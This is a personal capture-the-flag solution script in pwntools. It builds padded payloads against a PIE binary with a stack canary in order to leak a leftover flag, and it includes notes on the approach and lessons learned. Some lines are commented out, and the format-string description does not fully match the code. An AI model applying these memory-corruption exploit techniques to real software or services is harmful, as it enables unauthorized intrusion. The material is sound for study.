from pwn import *
from grwnapy.pwn import find_offset

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, b"300\n"+cyclic(500))
# win = elf.symbols['win']
# rop = ROP(elf)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])

""" DESC
Leak data left behind unintentionally to defeat a stack canary in a PIE binary. 

The challenge flavortext and tutorial is misleading. The point of the challenge is not to jump to win_authed()
But to abuse format strings (specifically %s) in the "you said:" print to print out the residual flag.
The offset for the flag can be brute-forced using a while loop that detects flag inside io.recvall() 

Walkthrough

"""

win_skip = 0x1dcb
# offset = 0x150-0x10-8
offset = 0x1b0-0x10-8

trigger = "REPEAT"

while (True):
    payload = flat([str(offset).encode(),
                    b"\n",
                    b"A"*(offset-len(trigger)),
                    trigger,
                    ])
    
    io = start()
    io.sendline(payload)
        # io.recvuntil(b'REPEAT')
        # canary = b"\x00" + io.recv(8)[1:]   # prepend the replaced nullbytes back, remember originally the first byte is the newline 0a
        # canary = canary[::-1].hex()      # reorder endiannes and turn to hex string
        # print(canary)
    payload = flat([b"0\n",
                    # b"AREPEAT"
                    ])

    io.sendline(payload)
    # data = io.recvall()
    # if b"pwn" in data:
    #     print(data)
    #     break
    # break
    io.interactive()
    break


"""
Things Learned:
win functions can be a lie
brute-forcing pwns can be fun :)
"""
